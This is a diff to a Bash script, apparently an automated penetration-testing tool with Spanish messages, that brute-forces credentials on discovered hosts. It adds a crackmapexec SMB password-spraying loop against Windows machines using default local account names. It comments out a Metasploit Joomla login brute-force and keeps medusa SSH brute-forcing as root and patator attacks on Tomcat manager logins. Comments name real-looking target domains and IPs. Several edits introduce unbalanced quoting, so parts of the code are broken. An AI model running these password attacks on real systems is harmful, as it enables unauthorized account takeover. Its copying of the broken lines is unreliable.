@@ -15,12 +15,12 @@ RESET='\e[0m'
 
 max_ins=10
 
-echo -e '  ______                  _                         __   ______ '
-echo -e ' / _____)                | |                       /  | / __   |'
-echo -e '| /       ____ ____  ____| |  _ ____  ____    _   /_/ || | //| |'
-echo -e '| |      / ___) _  |/ ___) | / ) _  )/ ___)  | | | || || |// | |'
-echo -e '| \_____| |  ( ( | ( (___| |< ( (/ /| |       \ V / | ||  /__| |'
-echo -e ' \______)_|   \_||_|\____)_| \_)____)_|        \_/  |_(_)_____/ '
+echo -e "  ______                  _                         __   ______ "
+echo -e " / _____)                | |                       /  | / __   |"
+echo -e "| /       ____ ____  ____| |  _ ____  ____    _   /_/ || | //| |"
+echo -e "| |      / ___) _  |/ ___) | / ) _  )/ ___)  | | | || || |// | |"
+echo -e "| \_____| |  ( ( | ( (___| |< ( (/ /| |       \ V / | ||  /__| |"
+echo -e " \______)_|   \_||_|\____)_| \_)____)_|        \_/  |_(_)_____/ "
 echo ''
 echo '										version 1.1'
 echo '									   daniel.torres@owasp.org'
@@ -243,6 +243,34 @@ then
 fi
 
 
+	### Windows
+	if [ -f servicios/Windows.txt ]
+	then		
+		echo -e "$OKBLUE\n\t#################### Testing windows auth ######################$RESET"			
+		for line in $(cat servicios/Windows.txt); do
+			ip=`echo $line | cut -f1 -d":"`
+			port=`echo $line | cut -f2 -d":"`
+
+			echo  "\n docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u $admin_user -p /home/passwords.txt" >> logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
+			docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u $admin_user -p /home/passwords.txt | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >> logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
+
+			if [[ "$MODE" == "vulnerabilidades" || "$MODE" == "completo" ]]; then 
+
+				if [ "$LENGUAJE" == "es" ]; then
+					echo -e "docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u soporte -p /home/passwords.txt --local-auth" >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
+					docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u soporte -p /home/passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
+					
+					echo -e "\n docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u sistemas -p /home/passwords.txt --local-auth" >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
+					docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u sistemas -p /home/passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
+				fi
+					
+				echo -e "\n docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u $ENTIDAD -p /home/passwords.txt --local-auth" >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null
+				docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb $ip -u $ENTIDAD -p /home/passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/"$ip"_windows_passwordAdivinadoWin.txt 2>/dev/null	&
+			fi
+		done	
+	fi
+
+
 
 old_ifs="$IFS"
 IFS=$'\n'  # make newlines the only separator     
@@ -254,7 +282,7 @@ then
 		IFS=$old_ifs
 		ip_port_path=`echo $line | cut -d ";" -f 1` #https://www.sanmateo.com.bo/wp-login.php https://www.sanmateo.com.bo:8443/wp-login.php		
 		fingerprint=`echo $line | cut -d ";" -f 2`
-		echo -e "\n\t########### $ip_port_path #######"	
+		echo -e "\n\t########### "$ip_port_path #######"	
 			
 		host_port=`echo $ip_port_path | cut -d "/" -f 3` # 190.129.69.107  - 190.129.69.107:8080
 		proto_http=`echo $ip_port_path | cut -d ":" -f 1`
@@ -311,13 +339,13 @@ then
 		
 		if [[ $fingerprint = *"joomla"* ]]; then
 			echo -e "\t[+] Joomla identificado"
-			echo -e "\t[+] Probando contraseñas comunes ...."
+			#echo -e "\t[+] Probando contraseñas comunes ...."
 			#cewl -w cewl-passwords.txt -e -a $proto_ip_port
 			#cat passwords.txt cewl-passwords.txt | sort | uniq > passwords.txt
-			echo "admin" > username.txt
-			echo "msfconsole -x \"use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $host;set AUTH_URI /$pathindex.php;set PASS_FILE passwords.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit\"" > logs/cracking/"$host"_"$port"_passwordCMS.txt
-			msfconsole -x "use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $host;set AUTH_URI /$pathindex.php;set PASS_FILE passwords.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit" >> logs/cracking/"$host"_"$port"_passwordCMS.txt 2>/dev/null &			
-			rm username.txt
+			#echo "admin" > username.txt
+			#echo "msfconsole -x \"use auxiliary/scanner/http/joomla_bruteforce_login;set USERNAME admin;set USERPASS_FILE '';set RHOSTS $host;set AUTH_URI /$pathindex.php;set PASS_FILE passwords.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit\"" > logs/cracking/"$host"_"$port"_passwordCMS.txt
+			#msfconsole -x "use auxiliary/scanner/http/joomla_bruteforce_login;set USERNAME admin;set USERPASS_FILE '';set RHOSTS $host;set AUTH_URI /$pathindex.php;set PASS_FILE passwords.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit" >> logs/cracking/"$host"_"$port"_passwordCMS.txt 2>/dev/null &			
+			#rm username.txt
 					
 		fi	
 
@@ -325,9 +353,9 @@ then
 		echo "line $fingerprint"	
 		#if [[ $fingerprint = *'/manager/html'* ]]; then
 		if [[ $fingerprint = *'tomcat admin'* ]]; then
-			echo -e "\t[+] Tomcat identificado ($ip_port_path)"										
+			echo -e "\t[+] Tomcat identificado ($ip_port_path)"									
 			echo -e "\t\t[+] Testing common passwords"	
-			#echo "patator.py http_fuzz url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwords_combo" 
+			#echo "patator.py http_fuzz url="$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwords_combo" 
 			patator.py http_fuzz --rate-limit=1 --threads=1 url=$ip_port_path user_pass=COMBO00:COMBO01 0=$tomcat_passwords_combo >> logs/cracking/"$host"_"$port"_passwordDefecto.txt 2>> logs/cracking/"$host"_"$port"_passwordAdminWeb.txt &
 		fi	
 
@@ -571,8 +599,7 @@ if [[ "$MODE" == "vulnerabilidades"  || "$MODE" == "completo" ]] ; then
 					medusa -u $username -P passwords.txt -h $ip -M ssh >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
 				done			
 			else
-				echo "Probando usuario: root"
-				#interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P passwords.txt -h _target_ -M ssh' >> logs/cracking/_target__"$port"_passwordAdivinadoServ.txt" --silent
+				echo "Probando usuario: root"				
 				medusa -u $entidad -P passwords.txt -h $ip -M ssh >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &			
 				medusa -u root -P passwords.txt -h $ip -M ssh >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
 			fi		
@@ -725,30 +752,6 @@ if [[ "$MODE" == "vulnerabilidades"  || "$MODE" == "completo" ]] ; then
 		insert_data	
 	fi
 	
-	### Windows
-	if [ -f servicios/Windows.txt ]
-	then
-		echo -e "\n\t $OKBLUE Testing windows auth  $RESET"	  	
-		
-		interlace -tL servicios/Windows.txt -threads 10 -c "echo  '\n docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u $admin_user -p /home/passwords.txt' >> logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
-
-		interlace -tL servicios/Windows.txt -threads 10 -c "docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u $admin_user -p /home/passwords.txt | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >> logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
-
-		if [[ "$MODE" == "vulnerabilidades" || "$MODE" == "completo" ]]; then 
-
-			if [ "$LENGUAJE" == "es" ]; then
-				interlace -tL servicios/Windows.txt -threads 10 -c "echo -e 'docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u soporte -p /home/passwords.txt --local-auth' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
-				interlace -tL servicios/Windows.txt -threads 10 -c "docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u soporte -p /home/passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
-				
-				interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u sistemas -p /home/passwords.txt --local-auth' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
-				interlace -tL servicios/Windows.txt -threads 10 -c "docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u sistemas -p /home/passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
-			fi
-				
-			interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u $ENTIDAD -p /home/passwords.txt --local-auth' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent
-			interlace -tL servicios/Windows.txt -threads 10 -c "docker run -v `pwd`:/home -it byt3bl33d3r/crackmapexec smb _target_ -u $ENTIDAD -p /home/passwords.txt --local-auth | sed -r 's/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g' >>  logs/cracking/_target__windows_passwordAdivinadoWin.txt 2>/dev/null" --silent		
-		fi	
-	fi
-
 
 	if [ -f servicios/ftp.txt ]
 	then 
@@ -851,7 +854,7 @@ fi #modo completo/vulnerabilidades
 
 ######## wait to finish########
 while true; do
-	scan_instancias=$((`ps aux | egrep 'medusa|docker|passWeb|patator.py' | egrep -v 'dockerd|color|keyring|docker-proxy' | wc -l` - 1)) 
+	scan_instancias=$((`ps aux | egrep 'medusa|docker|passWeb|patator.py' | egrep -v 'dockerd|color|keyring|docker-proxy|vscode-server|responder' | wc -l` - 1)) 
 	if [ "$scan_instancias" -gt 0 ]
 	then
 		echo -e "\t[i] Todavia hay escaneos de medusa/docker/passWeb activos ($scan_instancias)"  
@@ -1016,7 +1019,7 @@ then
 				echo "$ip_port_path (Creds $creds)" > .vulnerabilidades/"$host"_"$port"_passwordAdminWeb.txt 
 			else
 				echo -e "\t\t[+] Bruteforcing passwords (user=tomcat)"	
-				#echo "patator.py http_fuzz method=GET url=$ip_port_path user_pass=tomcat:FILE0 0=passwords.txt -e user_pass:b64 --threads=3" >> logs/cracking/"$host"_"$port"_passwordAdminWeb.txt  				
+				#echo "patator.py http_fuzz method=GET url="$ip_port_path user_pass=tomcat:FILE0 0=passwords.txt -e user_pass:b64 --threads=3" >> logs/cracking/"$host"_"$port"_passwordAdminWeb.txt  				
 				patator.py http_fuzz method=GET url=$ip_port_path user_pass=tomcat:FILE0 0=passwords.txt -e user_pass:b64 --threads=3 > logs/cracking/"$host"_"$port"_passwordAdminWeb.txt  2>> logs/cracking/"$host"_"$port"_passwordAdminWeb.txt 	
 				egrep -iq "INFO - 200" logs/cracking/"$host"_"$port"_passwordAdminWeb.txt 
 				greprc=$?
@@ -1024,7 +1027,7 @@ then
 					echo -e "\t\t[i] Password encontrado"
 					# 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
 					password=`grep --color=never "INFO - 200" logs/cracking/"$host"_"$port"_passwordAdminWeb.txt  | cut -d "|" -f 2 | tr -d ' '`
-					echo "$ip_port_path (Usuario:tomcat Password:$password)" > .vulnerabilidades/"$host"_"$port"_passwordAdminWeb.txt 
+					echo "$ip_port_path \(Usuario:tomcat Password:$password\)" > .vulnerabilidades/"$host"_"$port"_passwordAdminWeb.txt 
 				fi
 			fi																							
 		fi	
